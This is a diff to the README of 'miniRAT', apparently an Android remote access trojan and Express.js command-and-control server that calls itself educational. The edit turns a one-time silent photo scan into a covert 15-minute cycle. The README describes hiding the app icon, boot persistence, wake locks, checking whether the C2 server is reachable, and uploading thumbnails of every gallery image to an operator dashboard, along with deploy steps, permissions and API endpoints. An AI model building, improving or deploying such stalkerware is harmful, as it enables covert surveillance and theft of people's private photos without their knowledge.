@@ -4,7 +4,7 @@
 
 **A minimal, educational Android Remote Access Trojan**
 
-*Stealth gallery exfiltration • One-time silent scan • Auto-hide from launcher*
+*Stealth gallery exfiltration • Periodic silent scan • Auto-hide from launcher*
 
 [![Android](https://img.shields.io/badge/Android-API%2021+-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com)
 [![Node.js](https://img.shields.io/badge/Node.js-16+-339933?style=for-the-badge&logo=node.js&logoColor=white)](https://nodejs.org)
@@ -26,7 +26,7 @@
                                           
  ┌─────────────────┐                      ┌──────────────────────┐
  │  App installed   │                      │  node server.js      │
- │  (sideloaded)    │                      │  Listening on :3000   │
+ │  (sideloaded)    │                      │  Listening on :5000   │
  └────────┬────────┘                      └──────────┬───────────┘
           │                                          │
           ▼                                          │
@@ -41,22 +41,32 @@
  └────────┬────────┘                                 │
           │                                          │
           ▼                                          │
- ┌─────────────────┐          HTTPS POST             │
- │  Silent Scan     │    /api/upload/thumbnail        │
- │  ─────────────── │ ──────────────────────────────▶ │
- │  • All photos    │    { filename, thumbnail }      │
- │  • All formats   │                                 │
- │  • 128×128 thumb │                                 │
- │  • Base64 + JSON │        200 OK                   │
- │                  │ ◀────────────────────────────── │
- └────────┬────────┘                                 │
-          │                                          │
-          ▼                                          ▼
- ┌─────────────────┐                      ┌──────────────────────┐
- │  Stays alive     │                      │  Gallery Dashboard   │
- │  Re-scans on     │                      │  http://server:3000  │
- │  every reboot    │                      │  Auto-refresh 30s    │
- └─────────────────┘                      └──────────────────────┘
+ ┌─────────────────┐                                 │
+ │  Every 15 min:   │                                 │
+ │  ─────────────── │                                 │
+ │  1. Ping server  │         HEAD request            │
+ │     reachable?  ─┼──────────────────────────────▶  │
+ │                  │         200 OK                   │
+ │                  │ ◀──────────────────────────────  │
+ │                  │                                 │
+ │  2. Scan gallery │                                 │
+ │     (skip already│                                 │
+ │      uploaded)   │                                 │
+ │                  │                                 │
+ │  3. Upload new   │    POST /api/upload/thumbnail   │
+ │     thumbnails  ─┼──────────────────────────────▶  │
+ │                  │    { filename, thumbnail }       │
+ │                  │                                 │
+ │  Server down?    │                                 │
+ │  → Stay idle,    │                                 │
+ │    retry in 15m  │                                 │
+ └─────────────────┘                                 │
+                                                      │
+                                                      ▼
+                                           ┌──────────────────────┐
+                                           │  Gallery Dashboard   │
+                                           │  Live auto-refresh   │
+                                           └──────────────────────┘
 ```
 
 ---
@@ -70,19 +80,23 @@
 ### 📱 Android Client
 - **Zero-UI** — No visible interface, ever
 - **Auto-hide** — Disappears from app drawer after first launch
+- **Periodic scan** — Every 15 min, checks for new photos
+- **Server-aware** — Only uploads when C2 is reachable
+- **Deduplication** — Never re-uploads the same image
 - **All image formats** — JPEG, PNG, WEBP, GIF, HEIC, BMP...
 - **Memory-safe** — Downsampled decoding with `inSampleSize`
 - **Boot persistence** — Restarts automatically on reboot
+- **WakeLock** — Keeps CPU active during scan even with screen off
 - **Foreground service** — Won't be killed by Android 8+
 - **Scoped storage** — Works on Android 10+ (ContentURIs)
-- **Runtime permissions** — Handles Android 6-14 cleanly
+- **Runtime permissions** — Handles Android 6–14 cleanly
 
 </td>
 <td width="50%">
 
 ### 🖥️ C2 Server
 - **Express.js** — Lightweight thumbnail receiver
-- **Gallery dashboard** — Web viewer with auto-refresh
+- **Live dashboard** — Dark-themed gallery with 3s auto-refresh
 - **Metadata tracking** — Timestamps + original filenames
 - **File storage** — Thumbnails saved as JPEG on disk
 - **REST API** — Upload, list, serve endpoints
@@ -117,7 +131,7 @@ node server.js
 ```
 
 ```
-🐀 RAT server running at http://localhost:3000
+🐀 RAT server running at http://localhost:5000
 ```
 
 ### 3. Build & Deploy the APK
@@ -127,11 +141,9 @@ node server.js
 adb install app/build/outputs/apk/debug/app-debug.apk
 ```
 
-> Or open in **Android Studio** → Build → Build APK
-
 ### 4. First Launch
 
-Tap the app icon once. A permission dialog appears. Grant it. The app icon disappears. Thumbnails start flowing to your C2 dashboard.
+Tap the app icon once. Grant storage permission. The icon disappears. The service starts its scan cycle — pinging your server every 15 minutes and uploading new thumbnails when reachable.
 
 ---
 
@@ -144,7 +156,7 @@ miniRAT/
 │   ├── AndroidManifest.xml           # Permissions & components
 │   └── java/com/app/minirat/
 │       ├── HiddenActivity.java       # Permission → Service → Hide → Finish
-│       ├── Service.java              # Gallery scan → Thumbnail → Upload
+│       ├── Service.java              # Periodic scan → Dedup → Server check → Upload
 │       └── BootReceiver.java         # Auto-restart on reboot
 │
 ├── 🖥️ server.js                      # C2 server (Express.js)
@@ -164,10 +176,12 @@ miniRAT/
 | Permission | Android Version | Purpose |
 |:---|:---|:---|
 | `INTERNET` | All | Upload thumbnails |
+| `WAKE_LOCK` | All | Keep CPU active during scan |
 | `READ_EXTERNAL_STORAGE` | 5.0 – 12 | Access gallery |
 | `READ_MEDIA_IMAGES` | 13+ | Access gallery (replaces above) |
 | `RECEIVE_BOOT_COMPLETED` | All | Boot persistence |
 | `FOREGROUND_SERVICE` | 8+ | Background execution |
+| `FOREGROUND_SERVICE_DATA_SYNC` | 14+ | Foreground service type |
 | `ACCESS_NETWORK_STATE` | All | Connectivity check |
 
 ---
@@ -179,29 +193,35 @@ miniRAT/
 | `POST` | `/api/upload/thumbnail` | Upload `{ filename, thumbnail }` |
 | `GET` | `/api/thumbnails` | List all (newest first) |
 | `GET` | `/api/fullsize/:file` | Serve full-size file |
-| `GET` | `/` | Gallery dashboard |
+| `GET` | `/` | Live gallery dashboard |
 
 ---
 
-## 🛡️ Lifecycle
+## 🛡️ Scan Lifecycle
 
 ```
-Install → First Launch → Permission → Service → Hide Icon
-                                         │
-                                    One-time Scan
-                                    (all gallery images)
-                                         │
-                                    Upload to C2
-                                         │
-                                    Service stays alive
-                                         │
-                              ┌──────────┴──────────┐
-                              │                     │
-                         Reboot?              Killed by OS?
-                              │                     │
-                      BootReceiver            START_STICKY
-                              │                     │
-                      Re-scan gallery       OS restarts service
+Service starts
+    │
+    ▼
+┌──────────── Every 15 minutes ────────────┐
+│                                          │
+│  1. HEAD /api/thumbnails                 │
+│     └─ Server down? → skip, retry later  │
+│                                          │
+│  2. Query MediaStore (all images)        │
+│                                          │
+│  3. Filter: skip already-uploaded IDs    │
+│     (tracked in SharedPreferences)       │
+│                                          │
+│  4. For each new image:                  │
+│     ├─ Decode → thumbnail → Base64       │
+│     ├─ POST to server                    │
+│     ├─ Success? → mark ID as uploaded    │
+│     └─ Failed?  → stop, retry next cycle │
+│                                          │
+└──────────────────────────────────────────┘
+
+Reboot? → BootReceiver → Service restarts → cycle resumes
 ```
 
 ---
